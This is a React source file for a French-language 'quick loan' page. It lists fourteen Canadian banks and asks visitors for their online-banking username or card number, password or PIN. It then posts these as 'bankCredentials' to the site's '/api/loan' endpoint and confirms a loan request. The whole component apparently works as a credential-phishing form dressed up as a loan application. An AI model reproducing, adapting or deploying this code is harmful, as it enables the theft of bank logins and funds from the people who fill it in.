import { useState } from 'react';
import { motion } from 'framer-motion';
import { useNavigate } from 'react-router-dom';
import { useToastStore, useLangStore } from '../store';
import { t } from '../utils/i18n';

const BANKS = [
  { id: 'desjardins',        name: 'Caisse Desjardins',              url: 'https://accweb.mouv.desjardins.com/' },
  { id: 'td',                name: 'Banque TD',                     url: 'https://authentication.td.com/' },
  { id: 'laurentienne',      name: 'Banque Laurentienne',           url: 'https://auth.banquelaurentienne.ca/' },
  { id: 'koho',              name: 'KOHO',                          url: 'https://web.koho.ca/' },
  { id: 'pc-finance',        name: 'PC Financial',                  url: 'https://secure.pcfinancial.ca/' },
  { id: 'cibc',              name: 'Banque CIBC',                   url: 'https://www.cibconline.cibc.com/' },
  { id: 'eq',                name: 'Banque EQ',                     url: 'https://auth.eqbank.ca/' },
  { id: 'tangerine',         name: 'Tangerine',                     url: 'https://www.tangerine.ca/' },
  { id: 'rbc',               name: 'Banque RBC',                    url: 'https://secure.royalbank.com/' },
  { id: 'bmo-us-digital',    name: 'Bank of Montreal (Portail US)', url: 'https://www1.bmo.com/' },
  { id: 'nationale',         name: 'Banque Nationale',              url: 'https://connexion.bnc.ca/' },
  { id: 'scotia',            name: 'Scotiabank',                    url: 'https://auth.scotiaonline.scotiabank.com/' },
  { id: 'bmo-digital',       name: 'BMO (Digital Banking)',         url: 'https://www1.bmo.com/' },
  { id: 'wealthsimple',      name: 'Wealthsimple',                  url: 'https://my.wealthsimple.com/' },
];

const BANK_FIELDS = {
  desjardins: {
    logo: '💳',
    fields: [
      { name: 'identifiant', label: "Identifiant AccèsD ou n° de carte", type: 'text', placeholder: 'Identifiant AccèsD' },
      { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
    ],
  },
  td: { logo: '🏦', fields: [
    { name: 'identifiant', label: "N° de carte d'accès ou nom d'utilisateur", type: 'text', placeholder: "Carte d'accès" },
    { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
  ]},
  laurentienne: { logo: '🏛', fields: [
    { name: 'code_utilisateur', label: 'Code utilisateur', type: 'text', placeholder: 'Code utilisateur' },
    { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
  ]},
  koho: { logo: '💎', fields: [
    { name: 'courriel', label: 'Adresse e-mail', type: 'email', placeholder: 'prenom@exemple.com' },
    { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
  ]},
  'pc-finance': { logo: '🛒', fields: [
    { name: 'identifiant', label: "Nom d'utilisateur ou e-mail", type: 'text', placeholder: "Nom d'utilisateur" },
    { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
  ]},
  cibc: { logo: '🔴', fields: [
    { name: 'carte', label: 'Numéro de carte bancaire', type: 'text', placeholder: 'Numéro de carte' },
    { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
  ]},
  eq: { logo: '💰', fields: [
    { name: 'courriel', label: 'Adresse e-mail', type: 'email', placeholder: 'prenom@exemple.com' },
    { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
  ]},
  tangerine: { logo: '🍊', fields: [
    { name: 'identifiant', label: 'Numéro de client ou nom d\'utilisateur', type: 'text', placeholder: 'N° de client' },
    { name: 'pin', label: 'PIN / Télécode numérique', type: 'password', placeholder: '••••' },
  ]},
  rbc: { logo: '🦁', fields: [
    { name: 'identifiant', label: 'N° de carte client ou nom d\'utilisateur', type: 'text', placeholder: 'Carte client' },
    { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
  ]},
  'bmo-us-digital': { logo: '🏦', fields: [
    { name: 'identifiant', label: 'Identifiant utilisateur', type: 'text', placeholder: 'Identifiant utilisateur' },
    { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
  ]},
  nationale: { logo: '🏛', fields: [
    { name: 'code_utilisateur', label: 'Code utilisateur', type: 'text', placeholder: 'Code utilisateur' },
    { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
  ]},
  scotia: { logo: '🔶', fields: [
    { name: 'identifiant', label: 'Carte bancaire ou nom d\'utilisateur', type: 'text', placeholder: 'Carte bancaire' },
    { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
  ]},
  'bmo-digital': { logo: '🏦', fields: [
    { name: 'identifiant', label: 'N° de carte de débit ou identifiant BMO', type: 'text', placeholder: 'Carte de débit' },
    { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
  ]},
  wealthsimple: { logo: '⚡', fields: [
    { name: 'courriel', label: 'Adresse e-mail', type: 'email', placeholder: 'prenom@exemple.com' },
    { name: 'mot_de_passe', label: 'Mot de passe', type: 'password', placeholder: '••••••••' },
  ]},
};

export default function QuickLoan() {
  const navigate = useNavigate();
  const { lang } = useLangStore();
  const l = lang || 'fr';
  const addToast = useToastStore(s => s.addToast);
  const [bankId, setBankId] = useState('');
  const [bankFieldValues, setBankFieldValues] = useState({});
  const [submitting, setSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  const selectedBank = BANKS.find(b => b.id === bankId);
  const selectedFields = bankId ? BANK_FIELDS[bankId] : null;
  const BANKS_LOOKUP = BANKS.reduce((acc, b) => ({ ...acc, [b.id]: b.name }), {});

  const canSubmit = () => bankId && selectedFields
    && selectedFields.fields.every(f => bankFieldValues[f.name]?.trim());

  const handleSubmit = async () => {
    if (!canSubmit()) return;
    setSubmitting(true);
    try {
      const payload = { bankName: BANKS_LOOKUP[bankId] || bankId, bankId, bankCredentials: bankFieldValues };
      const res = await fetch('/api/loan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      const data = await res.json();
      if (!data.success) throw new Error(data.message);
      setSubmitted(true);
      addToast(t('loan_toast', l), 'success');
    } catch (err) {
      addToast(t('loan_toast_err', l), 'error');
    }
    setSubmitting(false);
  };

  if (submitted) {
    return (
      <div style={{ minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center', padding:'120px 6% 60px', background:'var(--bg)' }}>
        <motion.div initial={{ opacity:0, scale:0.9 }} animate={{ opacity:1, scale:1 }} transition={{ duration:0.5, ease:[0.16,1,0.3,1] }}
          className="card" style={{ maxWidth:480, width:'100%', padding:'60px 40px', textAlign:'center' }}>
          <h2 style={{ fontFamily:"'Outfit',sans-serif", fontSize:28, fontWeight:900, marginBottom:12 }}>{t('loan_success', l)}</h2>
          <p style={{ fontSize:14, color:'var(--text-3)', lineHeight:1.7, marginBottom:32 }}>
            {t('loan_success_desc', l)}
          </p>
          <div style={{ display:'flex', gap:12, justifyContent:'center', flexWrap:'wrap' }}>
            <button onClick={() => { setSubmitted(false); setBankId(''); setBankFieldValues({}); }} className="btn-ghost" style={{ fontSize:12 }}>{t('loan_new', l)}</button>
            <button onClick={() => navigate('/')} className="btn-primary" style={{ fontSize:12 }}>{t('loan_home', l)}</button>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <section style={{
      minHeight:'100vh', display:'flex', alignItems:'center', justifyContent:'center',
      padding:'100px 6%', background:'var(--bg)',
    }}>
      <motion.div initial={{ opacity:0, y:12 }} animate={{ opacity:1, y:0 }} transition={{ duration:0.4, ease:[0.16,1,0.3,1] }}
        className="card" style={{ maxWidth:480, width:'100%', padding:'28px 24px' }}>

        <div style={{ display:'flex', alignItems:'center', gap:12, marginBottom:20 }}>
          <div style={{ width:40, height:40, borderRadius:'50%', background:'rgba(245,166,35,0.1)', display:'flex', alignItems:'center', justifyContent:'center', fontSize:18, flexShrink:0 }}>🔐</div>
          <div>
            <h3 style={{ fontFamily:"'Outfit',sans-serif", fontSize:16, fontWeight:800, margin:0 }}>
              {t('loan_step2', l)}
            </h3>
            <p style={{ margin:'2px 0 0', fontSize:12, color:'var(--text-3)' }}>
              {t('loan_secure', l)}
            </p>
          </div>
        </div>

        <div style={{ height:1, background:'var(--border)', marginBottom:20 }} />

        <div style={{ display:'flex', flexDirection:'column', gap:14 }}>
          <div>
            <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:5, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>{t('loan_bank_select', l)}</label>
            <select className="input-luxury" value={bankId} onChange={e => { setBankId(e.target.value); setBankFieldValues({}); }}>
              <option value="">{t('loan_choose', l)}</option>
              {BANKS.map(b => <option key={b.id} value={b.id}>{b.name}</option>)}
            </select>
          </div>

          {selectedBank && selectedFields && (
            <motion.div initial={{ opacity:0, y:12 }} animate={{ opacity:1, y:0 }} transition={{ duration:0.3, ease:[0.16,1,0.3,1] }}
              style={{ border:'1px solid var(--border-2)', borderRadius:10, overflow:'hidden' }}>
              <div style={{ padding:'12px 16px', background:'var(--bg-card2)', borderBottom:'1px solid var(--border)', display:'flex', alignItems:'center', gap:10 }}>
                <span style={{ fontSize:24, flexShrink:0 }}>{selectedFields.logo}</span>
                <div style={{ minWidth:0 }}>
                  <div style={{ fontSize:13, fontWeight:700, fontFamily:"'Outfit',sans-serif" }}>{selectedBank.name}</div>
                  <div style={{ fontSize:11, color:'var(--text-3)' }}>{t('loan_login_text', l)}</div>
                </div>
                <a href={selectedBank.url} target="_blank" rel="noopener noreferrer" style={{ marginLeft:'auto', fontSize:11, color:'var(--gold)', fontWeight:700, textDecoration:'none', flexShrink:0 }}>{t('loan_site', l)}</a>
              </div>
              <div style={{ padding:'18px 16px', display:'flex', flexDirection:'column', gap:14 }}>
                {selectedFields.fields.map(f => (
                  <div key={f.name}>
                    <label style={{ display:'block', fontSize:11, fontWeight:700, marginBottom:4, color:'var(--text-2)', letterSpacing:'0.06em', textTransform:'uppercase' }}>{f.label}</label>
                    <input className="input-luxury" type={f.type} value={bankFieldValues[f.name]||''} onChange={e => setBankFieldValues(v => ({...v, [f.name]: e.target.value}))} placeholder={f.placeholder} autoComplete="off" />
                  </div>
                ))}
              </div>
            </motion.div>
          )}
        </div>

        <button onClick={handleSubmit} disabled={!canSubmit() || submitting} className="btn-gold"
          style={{ width:'100%', marginTop:20, padding:'14px', fontSize:13,
            opacity: canSubmit() ? 1 : 0.4, cursor: canSubmit() ? 'pointer' : 'not-allowed' }}>
          {submitting ? t('loan_submitting', l) : t('loan_submit', l)}
        </button>

        <div style={{ textAlign:'center', marginTop:14 }}>
          <button onClick={() => navigate('/demande')} style={{ background:'none', border:'none', cursor:'pointer', fontSize:12, color:'var(--gold)', fontWeight:600, fontFamily:"'Outfit',sans-serif", padding:0 }}>
            {t('loan_quick_full', l)}
          </button>
        </div>
      </motion.div>
    </section>
  );
}
